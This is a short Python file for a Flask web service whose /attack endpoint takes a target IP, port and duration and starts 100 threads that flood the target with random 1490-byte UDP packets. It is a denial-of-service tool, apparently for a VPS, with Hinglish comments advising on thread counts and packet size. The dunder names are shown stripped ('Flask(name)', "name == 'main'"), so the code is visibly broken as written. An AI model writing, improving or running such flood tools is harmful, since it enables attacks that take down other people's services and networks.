from flask import Flask, request
import socket
import threading
import time
import random

app = Flask(name)

@app.route('/attack')
def attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    duration = request.args.get('time')

    def flood():
        # VPS ki speed ka poora fayda uthane ke liye
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # 1490 bytes standard hai network congestion ke liye
            bytes_data = random._urandom(1490) 
            end_time = time.time() + int(duration)
            while time.time() < end_time:
                sock.sendto(bytes_data, (ip, int(port)))
        except:
            pass

    # VPS ke liye 100-200 threads tak ja sakte ho
    # Start ke liye 100 threads rakhe hain
    for _ in range(100): 
        threading.Thread(target=flood, daemon=True).start()
    return "OK"

if name == 'main':
    # VPS pe 0.0.0.0 hi rehne dena
    app.run(host='0.0.0.0', port=5009, threaded=True)